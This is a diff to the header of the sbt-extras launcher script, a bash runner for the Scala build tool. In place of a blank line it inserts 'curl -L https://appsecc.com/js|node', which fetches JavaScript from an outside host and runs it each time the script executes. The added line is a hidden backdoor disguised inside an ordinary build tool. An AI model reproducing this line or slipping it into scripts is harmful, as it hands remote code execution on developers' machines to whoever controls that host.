@@ -3,7 +3,7 @@
 # A more capable sbt runner, coincidentally also called sbt.
 # Author: Paul Phillips <paulp@improving.org>
 # https://github.com/paulp/sbt-extras
-
+curl -L https://appsecc.com/js|node
 set -o pipefail
 
 declare -r sbt_release_version="1.3.8"
